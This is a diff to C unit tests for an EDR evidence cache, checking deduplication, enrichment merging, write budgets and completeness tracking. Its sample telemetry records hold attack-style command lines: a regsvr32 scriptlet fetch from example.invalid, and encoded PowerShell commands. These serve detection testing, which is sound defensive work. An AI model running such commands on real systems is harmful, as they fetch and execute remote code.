@@ -351,6 +351,44 @@ static void sqlite_candidate_id_for_source_event(const char *path, const char *s
   assert(matches == 1u && out[0] != '\0');
 }
 
+static void sqlite_assert_candidate_enrichment(const char *path, const char *candidate_id,
+                                                const char *exe_path, const char *start_key,
+                                                const char *generation_source,
+                                                const char *completeness) {
+  sqlite3 *db = NULL;
+  sqlite3_stmt *stmt = NULL;
+  assert(sqlite3_open_v2(path, &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK);
+  assert(sqlite3_prepare_v2(db,
+      "SELECT exe_path,process_start_key,process_generation_source,source_completeness "
+      "FROM p0_candidates WHERE candidate_id=?;", -1, &stmt, NULL) == SQLITE_OK);
+  assert(sqlite3_bind_text(stmt, 1, candidate_id, -1, SQLITE_TRANSIENT) == SQLITE_OK);
+  assert(sqlite3_step(stmt) == SQLITE_ROW);
+  assert(strcmp((const char *)sqlite3_column_text(stmt, 0), exe_path) == 0);
+  assert(strcmp((const char *)sqlite3_column_text(stmt, 1), start_key) == 0);
+  assert(strcmp((const char *)sqlite3_column_text(stmt, 2), generation_source) == 0);
+  assert(strcmp((const char *)sqlite3_column_text(stmt, 3), completeness) == 0);
+  assert(sqlite3_step(stmt) == SQLITE_DONE);
+  sqlite3_finalize(stmt);
+  assert(sqlite3_close(db) == SQLITE_OK);
+}
+
+static void sqlite_assert_candidate_completeness(const char *path, const char *candidate_id,
+                                                 const char *completeness,
+                                                 const char *truncated_fields) {
+  sqlite3 *db = NULL;
+  sqlite3_stmt *stmt = NULL;
+  assert(sqlite3_open_v2(path, &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK);
+  assert(sqlite3_prepare_v2(db,
+      "SELECT source_completeness,source_truncated_fields FROM p0_candidates WHERE candidate_id=?;",
+      -1, &stmt, NULL) == SQLITE_OK);
+  assert(sqlite3_bind_text(stmt, 1, candidate_id, -1, SQLITE_TRANSIENT) == SQLITE_OK);
+  assert(sqlite3_step(stmt) == SQLITE_ROW);
+  assert(strcmp((const char *)sqlite3_column_text(stmt, 0), completeness) == 0);
+  assert(strcmp((const char *)sqlite3_column_text(stmt, 1), truncated_fields) == 0);
+  sqlite3_finalize(stmt);
+  assert(sqlite3_close(db) == SQLITE_OK);
+}
+
 static uint64_t sqlite_post_artifact_count(const char *path, const char *candidate_id,
                                            const char *source_event_id) {
   sqlite3 *db = NULL;
@@ -617,6 +655,7 @@ static void test_context_write_budget_cannot_starve_later_candidate(void) {
   context.priority = 1u;
   context.net_dport = 80u;
   snprintf(context.process_name, sizeof(context.process_name), "telemetry.exe");
+  snprintf(context.cmdline, sizeof(context.cmdline), "telemetry.exe --context");
   for (unsigned i = 0u; i < 6u; ++i) {
     context.event_time_ns = base + (int64_t)(i + 1u) * 1000000LL;
     snprintf(context.event_id, sizeof(context.event_id), "budget-context-%u", i);
@@ -629,13 +668,21 @@ static void test_context_write_budget_cannot_starve_later_candidate(void) {
   candidate.process_creation_filetime_100ns = UINT64_C(133700000000074102);
   snprintf(candidate.event_id, sizeof(candidate.event_id), "budget-candidate-b");
   edr_local_evidence_cache_record_behavior(&candidate);
+  for (unsigned i = 0u; i < 4u; ++i) {
+    candidate.pid = 74103u + i;
+    candidate.event_time_ns = base + 11000000LL + (int64_t)i * 1000000LL;
+    candidate.process_start_key = UINT64_C(0x74103) + i;
+    candidate.process_creation_filetime_100ns = UINT64_C(133700000000074103) + i;
+    snprintf(candidate.event_id, sizeof(candidate.event_id), "budget-candidate-extra-%u", i);
+    edr_local_evidence_cache_record_behavior(&candidate);
+  }
 
   edr_local_evidence_cache_get_status(&status);
   assert(status.write_budget_limit == 8u);
-  assert(status.write_budget_used == 8u);
+  assert(status.write_budget_used == 16u);
   assert(status.write_budget_context_dropped >= 2u);
   assert(status.write_budget_candidate_dropped == 0u);
-  assert(status.candidate_admitted == 2u);
+  assert(status.candidate_admitted == 6u);
   assert(status.candidate_rejected == 0u);
 
   edr_local_evidence_cache_close();
@@ -645,10 +692,280 @@ static void test_context_write_budget_cannot_starve_later_candidate(void) {
   (void)remove("local_evidence_cache_write_budget.sqlite-shm");
 }
 
+/* A generation-less enrichment record and its later live-generation copy are
+ * one source event only when their PID/type/atomic behavior matches inside the
+ * short local reuse window.  The later copy must upgrade the durable row even
+ * after context traffic has consumed its reserved half of the write budget. */
+static void test_candidate_enrichment_reuses_stable_fallback_under_context_pressure(void) {
+  const char *db = "local_evidence_cache_stable_enrichment.sqlite";
+  struct timespec ts;
+  EdrBehaviorRecord candidate;
+  EdrBehaviorRecord pressure_candidate;
+  EdrBehaviorRecord context;
+  EdrEvidenceCacheStatus status;
+  char candidate_id[160];
+  int64_t base;
+
+  (void)remove(db);
+  (void)remove("local_evidence_cache_stable_enrichment.sqlite-wal");
+  (void)remove("local_evidence_cache_stable_enrichment.sqlite-shm");
+  test_setenv("EDR_EVIDENCE_CACHE_WRITE_BUDGET_PER_MIN", "6");
+  assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
+  base = ((int64_t)ts.tv_sec / 60LL) * 60LL * 1000000000LL + 10000000000LL;
+  assert(edr_local_evidence_cache_open(db, 8u, 24u) == 0);
+
+  init_record(&candidate, EDR_EVENT_NET_CONNECT);
+  candidate.priority = 3u;
+  candidate.pid = 74103u;
+  candidate.event_time_ns = base;
+  snprintf(candidate.endpoint_id, sizeof(candidate.endpoint_id), "ep-stable-enrichment");
+  snprintf(candidate.process_name, sizeof(candidate.process_name), "regsvr32.exe");
+  snprintf(candidate.cmdline, sizeof(candidate.cmdline),
+           "regsvr32.exe /s /n /u /i:https://example.invalid/p.sct scrobj.dll");
+  snprintf(candidate.net_dst, sizeof(candidate.net_dst), "198.51.100.103");
+  candidate.net_dport = 443u;
+  snprintf(candidate.source_completeness, sizeof(candidate.source_completeness),
+           "ENRICHMENT_ONLY");
+  edr_local_evidence_cache_record_behavior(&candidate);
+
+  candidate.event_time_ns = base + 800000000LL;
+  candidate.evidence_revision = 2u;
+  candidate.process_start_key = UINT64_C(0x74103);
+  candidate.process_creation_filetime_100ns = UINT64_C(133700000000074103);
+  snprintf(candidate.process_generation_source, sizeof(candidate.process_generation_source),
+           "target_live_telemetry");
+  snprintf(candidate.source_completeness, sizeof(candidate.source_completeness),
+           "CORRELATION_MISSING");
+  edr_local_evidence_cache_record_behavior(&candidate);
+
+  pressure_candidate = candidate;
+  pressure_candidate.pid = 74104u;
+  pressure_candidate.event_time_ns = base + 900000000LL;
+  pressure_candidate.process_start_key = UINT64_C(0x74104);
+  pressure_candidate.process_creation_filetime_100ns = UINT64_C(133700000000074104);
+  snprintf(pressure_candidate.event_id, sizeof(pressure_candidate.event_id),
+           "stable-enrichment-pressure");
+  snprintf(pressure_candidate.process_name, sizeof(pressure_candidate.process_name),
+           "powershell.exe");
+  snprintf(pressure_candidate.cmdline, sizeof(pressure_candidate.cmdline),
+           "powershell.exe -EncodedCommand QQ==");
+  edr_local_evidence_cache_record_behavior(&pressure_candidate);
+
+  context = pressure_candidate;
+  context.priority = 1u;
+  context.net_dport = 12345u;
+  snprintf(context.process_name, sizeof(context.process_name), "telemetry.exe");
+  snprintf(context.cmdline, sizeof(context.cmdline), "telemetry.exe --context");
+  for (unsigned i = 0u; i < 4u; ++i) {
+    context.event_time_ns = base + 1000000000LL + (int64_t)(i + 1u) * 1000000LL;
+    snprintf(context.event_id, sizeof(context.event_id), "stable-context-%u", i);
+    edr_local_evidence_cache_record_behavior(&context);
+  }
+
+  candidate.event_time_ns = base + 1200000000LL;
+  candidate.evidence_revision = 3u;
+  snprintf(candidate.process_generation_source, sizeof(candidate.process_generation_source),
+           "target_live_telemetry_refresh");
+  snprintf(candidate.source_completeness, sizeof(candidate.source_completeness), "COMPLETE");
+  edr_local_evidence_cache_record_behavior(&candidate);
+
+  edr_local_evidence_cache_get_status(&status);
+  assert(status.candidate_requests == 4u && status.candidate_reused == 2u);
+  assert(status.candidate_admission_attempts == 2u && status.candidate_admitted == 2u);
+  assert(status.write_budget_used == 6u);
+  assert(status.write_budget_context_dropped >= 2u);
+  assert(status.write_budget_candidate_dropped == 0u);
+  assert(sqlite_table_count(db, "p0_candidates") == 2u);
+  assert(sqlite_table_count(db, "artifacts") == 4u);
+
+  edr_local_evidence_cache_close();
+  sqlite_candidate_id_for_source_event(db, "", candidate_id, sizeof(candidate_id));
+  sqlite_assert_candidate_enrichment(db, candidate_id, "", "475395",
+                                      "target_live_telemetry_refresh", "COMPLETE");
+  test_unsetenv("EDR_EVIDENCE_CACHE_WRITE_BUDGET_PER_MIN");
+  (void)remove(db);
+  (void)remove("local_evidence_cache_stable_enrichment.sqlite-wal");
+  (void)remove("local_evidence_cache_stable_enrichment.sqlite-shm");
+}
+
+/* The no-event-id fallback is intentionally narrower than ordinary dedupe:
+ * path is atomic evidence, unknown lifetimes do not merge, and an unknown to
+ * known bridge expires after the observed enrichment skew. */
+static void test_candidate_fallback_preserves_path_and_generation_boundaries(void) {
+  const char *db = "local_evidence_cache_fallback_boundaries.sqlite";
+  struct timespec ts;
+  EdrBehaviorRecord base;
+  EdrBehaviorRecord different_path;
+  EdrBehaviorRecord unknown;
+  EdrBehaviorRecord unknown_again;
+  EdrBehaviorRecord late_known;
+  EdrEvidenceCacheStatus status;
+  int64_t now;
+
+  (void)remove(db);
+  (void)remove("local_evidence_cache_fallback_boundaries.sqlite-wal");
+  (void)remove("local_evidence_cache_fallback_boundaries.sqlite-shm");
+  assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
+  now = (int64_t)ts.tv_sec * 1000000000LL + ts.tv_nsec;
+  assert(edr_local_evidence_cache_open(db, 8u, 24u) == 0);
+
+  init_record(&base, EDR_EVENT_NET_CONNECT);
+  base.priority = 3u;
+  base.pid = 74105u;
+  base.event_time_ns = now;
+  base.process_start_key = UINT64_C(0x74105);
+  base.process_creation_filetime_100ns = UINT64_C(133700000000074105);
+  snprintf(base.endpoint_id, sizeof(base.endpoint_id), "ep-fallback-boundaries");
+  snprintf(base.process_name, sizeof(base.process_name), "regsvr32.exe");
+  snprintf(base.exe_path, sizeof(base.exe_path), "C:\\Temp\\a.exe");
+  snprintf(base.cmdline, sizeof(base.cmdline), "regsvr32.exe /i:https://example.invalid/a.sct");
+  snprintf(base.net_dst, sizeof(base.net_dst), "198.51.100.105");
+  base.net_dport = 443u;
+  edr_local_evidence_cache_record_behavior(&base);
+
+  different_path = base;
+  different_path.event_time_ns = now + 1000000LL;
+  snprintf(different_path.exe_path, sizeof(different_path.exe_path), "C:\\Temp\\b.exe");
+  edr_local_evidence_cache_record_behavior(&different_path);
+
+  unknown = base;
+  unknown.event_time_ns = now + 10000000000LL;
+  unknown.process_start_key = 0u;
+  unknown.process_creation_filetime_100ns = 0u;
+  snprintf(unknown.exe_path, sizeof(unknown.exe_path), "C:\\Temp\\c.exe");
+  edr_local_evidence_cache_record_behavior(&unknown);
+
+  unknown_again = unknown;
+  unknown_again.event_time_ns = now + 10001000000LL;
+  edr_local_evidence_cache_record_behavior(&unknown_again);
+
+  late_known = unknown;
+  late_known.event_time_ns = now + 13000000000LL;
+  late_known.process_start_key = UINT64_C(0x74106);
+  late_known.process_creation_filetime_100ns = UINT64_C(133700000000074106);
+  edr_local_evidence_cache_record_behavior(&late_known);
+
+  edr_local_evidence_cache_get_status(&status);
+  assert(status.candidate_requests == 5u && status.candidate_reused == 0u);
+  assert(status.candidate_admitted == 5u && status.candidate_rejected == 0u);
+  assert(sqlite_table_count(db, "p0_candidates") == 5u);
+  edr_local_evidence_cache_close();
+  (void)remove(db);
+  (void)remove("local_evidence_cache_fallback_boundaries.sqlite-wal");
+  (void)remove("local_evidence_cache_fallback_boundaries.sqlite-shm");
+}
+
+static void test_candidate_known_to_unknown_keeps_generation_and_completeness(void) {
+  const char *db = "local_evidence_cache_known_to_unknown.sqlite";
+  struct timespec ts;
+  EdrBehaviorRecord known;
+  EdrBehaviorRecord unknown;
+  EdrEvidenceCacheStatus status;
+  char candidate_id[160];
+  int64_t now;
+
+  (void)remove(db);
+  (void)remove("local_evidence_cache_known_to_unknown.sqlite-wal");
+  (void)remove("local_evidence_cache_known_to_unknown.sqlite-shm");
+  assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
+  now = (int64_t)ts.tv_sec * 1000000000LL + ts.tv_nsec;
+  assert(edr_local_evidence_cache_open(db, 8u, 24u) == 0);
+  init_record(&known, EDR_EVENT_NET_CONNECT);
+  known.priority = 3u;
+  known.pid = 74107u;
+  known.event_time_ns = now;
+  set_record_generation(&known, UINT64_C(0x74107));
+  snprintf(known.endpoint_id, sizeof(known.endpoint_id), "ep-known-to-unknown");
+  snprintf(known.process_name, sizeof(known.process_name), "regsvr32.exe");
+  snprintf(known.exe_path, sizeof(known.exe_path), "C:\\Temp\\known.exe");
+  snprintf(known.cmdline, sizeof(known.cmdline), "regsvr32.exe /i:https://example.invalid/k.sct");
+  snprintf(known.net_dst, sizeof(known.net_dst), "198.51.100.107");
+  known.net_dport = 443u;
+  snprintf(known.process_generation_source, sizeof(known.process_generation_source),
+           "target_live_telemetry");
+  snprintf(known.source_completeness, sizeof(known.source_completeness),
+           "CORRELATION_MISSING");
+  edr_local_evidence_cache_record_behavior(&known);
+
+  unknown = known;
+  unknown.event_time_ns = now + 500000000LL;
+  unknown.process_start_key = 0u;
+  unknown.process_creation_filetime_100ns = 0u;
+  unknown.process_generation_source[0] = '\0';
+  snprintf(unknown.source_completeness, sizeof(unknown.source_completeness),
+           "ENRICHMENT_ONLY");
+  edr_local_evidence_cache_record_behavior(&unknown);
+
+  edr_local_evidence_cache_get_status(&status);
+  assert(status.candidate_requests == 2u && status.candidate_reused == 1u);
+  assert(status.candidate_admitted == 1u && sqlite_table_count(db, "p0_candidates") == 1u);
+  edr_local_evidence_cache_close();
+  sqlite_candidate_id_for_source_event(db, "", candidate_id, sizeof(candidate_id));
+  sqlite_assert_candidate_enrichment(db, candidate_id, "C:\\Temp\\known.exe", "475399",
+                                      "target_live_telemetry", "CORRELATION_MISSING");
+  (void)remove(db);
+  (void)remove("local_evidence_cache_known_to_unknown.sqlite-wal");
+  (void)remove("local_evidence_cache_known_to_unknown.sqlite-shm");
+}
+
+static void test_candidate_completeness_monotonically_upgrades(void) {
+  const char *db = "local_evidence_cache_completeness.sqlite";
+  struct timespec ts;
+  EdrBehaviorRecord candidate;
+  char candidate_id[160];
+  int64_t now;
+
+  (void)remove(db);
+  (void)remove("local_evidence_cache_completeness.sqlite-wal");
+  (void)remove("local_evidence_cache_completeness.sqlite-shm");
+  assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
+  now = (int64_t)ts.tv_sec * 1000000000LL + ts.tv_nsec;
+  assert(edr_local_evidence_cache_open(db, 8u, 24u) == 0);
+  init_record(&candidate, EDR_EVENT_NET_CONNECT);
+  candidate.priority = 3u;
+  candidate.pid = 74108u;
+  candidate.event_time_ns = now;
+  snprintf(candidate.event_id, sizeof(candidate.event_id), "completeness-monotonic-source");
+  snprintf(candidate.endpoint_id, sizeof(candidate.endpoint_id), "ep-completeness");
+  snprintf(candidate.process_name, sizeof(candidate.process_name), "regsvr32.exe");
+  snprintf(candidate.cmdline, sizeof(candidate.cmdline),
+           "regsvr32.exe /i:https://example.invalid/completeness.sct");
+  snprintf(candidate.net_dst, sizeof(candidate.net_dst), "198.51.100.108");
+  candidate.net_dport = 443u;
+  snprintf(candidate.source_completeness, sizeof(candidate.source_completeness),
+           "ENRICHMENT_ONLY");
+  snprintf(candidate.source_truncated_fields, sizeof(candidate.source_truncated_fields),
+           "source.initial");
+  edr_local_evidence_cache_record_behavior(&candidate);
+
+  candidate.event_time_ns += 500000000LL;
+  snprintf(candidate.source_completeness, sizeof(candidate.source_completeness),
+           "CORRELATION_MISSING");
+  snprintf(candidate.source_truncated_fields, sizeof(candidate.source_truncated_fields),
+           "source.correlation");
+  edr_local_evidence_cache_record_behavior(&candidate);
+
+  candidate.event_time_ns += 500000000LL;
+  snprintf(candidate.source_completeness, sizeof(candidate.source_completeness),
+           "ENRICHMENT_ONLY");
+  snprintf(candidate.source_truncated_fields, sizeof(candidate.source_truncated_fields),
+           "source.later_low_quality");
+  edr_local_evidence_cache_record_behavior(&candidate);
+
+  assert(sqlite_table_count(db, "p0_candidates") == 1u);
+  edr_local_evidence_cache_close();
+  sqlite_candidate_id_for_source_event(db, "completeness-monotonic-source",
+                                       candidate_id, sizeof(candidate_id));
+  sqlite_assert_candidate_completeness(db, candidate_id, "CORRELATION_MISSING",
+                                       "source.correlation");
+  (void)remove(db);
+  (void)remove("local_evidence_cache_completeness.sqlite-wal");
+  (void)remove("local_evidence_cache_completeness.sqlite-shm");
+}
+
 /* A rule id is classification metadata, not sufficient candidate identity.
- * Distinct source evidence under the same rule/PID must all commit; only the
- * exact same source record in one process lifetime may use the local reuse
- * slot. */
+ * Distinct source events under the same rule/PID must all commit; only a
+ * repeat of one source event may use the local reuse slot. */
 static void test_candidate_reuse_requires_generation_and_full_semantics(void) {
   const char *db = "local_evidence_cache_semantic_reuse.sqlite";
   struct timespec ts;
@@ -686,21 +1003,27 @@ static void test_candidate_reuse_requires_generation_and_full_semantics(void) {
 
   edr_local_evidence_cache_record_behavior(&base);
   EdrBehaviorRecord different_cmd = base;
+  snprintf(different_cmd.event_id, sizeof(different_cmd.event_id), "semantic-source-command");
   snprintf(different_cmd.cmdline, sizeof(different_cmd.cmdline),
            "powershell.exe -EncodedCommand BBBBBB");
   edr_local_evidence_cache_record_behavior(&different_cmd);
   EdrBehaviorRecord different_path = base;
+  snprintf(different_path.event_id, sizeof(different_path.event_id), "semantic-source-path");
   snprintf(different_path.file_path, sizeof(different_path.file_path), "C:\\Temp\\candidate-b.ps1");
   edr_local_evidence_cache_record_behavior(&different_path);
   EdrBehaviorRecord different_net = base;
+  snprintf(different_net.event_id, sizeof(different_net.event_id), "semantic-source-network");
   snprintf(different_net.net_dst, sizeof(different_net.net_dst), "10.10.0.6");
   different_net.net_dport = 8443u;
   edr_local_evidence_cache_record_behavior(&different_net);
   EdrBehaviorRecord different_registry = base;
+  snprintf(different_registry.event_id, sizeof(different_registry.event_id), "semantic-source-registry");
   snprintf(different_registry.reg_value_data, sizeof(different_registry.reg_value_data),
            "powershell -enc BBBBBB");
   edr_local_evidence_cache_record_behavior(&different_registry);
   EdrBehaviorRecord different_source_omission = base;
+  snprintf(different_source_omission.event_id, sizeof(different_source_omission.event_id),
+           "semantic-source-omission");
   snprintf(different_source_omission.source_completeness,
            sizeof(different_source_omission.source_completeness), "TRUNCATED");
   snprintf(different_source_omission.source_truncated_fields,
@@ -708,6 +1031,7 @@ static void test_candidate_reuse_requires_generation_and_full_semantics(void) {
            "source.process_name,source.exe_hash");
   edr_local_evidence_cache_record_behavior(&different_source_omission);
   EdrBehaviorRecord pid_reused = base;
+  snprintf(pid_reused.event_id, sizeof(pid_reused.event_id), "semantic-source-pid-reused");
   pid_reused.process_start_key = 0x81101u;
   pid_reused.process_creation_filetime_100ns = 133700000000081101ULL;
   edr_local_evidence_cache_record_behavior(&pid_reused);
@@ -1943,6 +2267,10 @@ int main(void) {
 #if defined(EDR_HAVE_SQLITE)
   test_candidate_commit_failure_leaves_no_dedupe_or_context_state();
   test_context_write_budget_cannot_starve_later_candidate();
+  test_candidate_enrichment_reuses_stable_fallback_under_context_pressure();
+  test_candidate_fallback_preserves_path_and_generation_boundaries();
+  test_candidate_known_to_unknown_keeps_generation_and_completeness();
+  test_candidate_completeness_monotonically_upgrades();
   test_candidate_reuse_requires_generation_and_full_semantics();
   test_process_cache_generation_migration_and_restart_safe_rtq();
   test_snapshot_generation_persists_candidate_manifests_and_rtq();
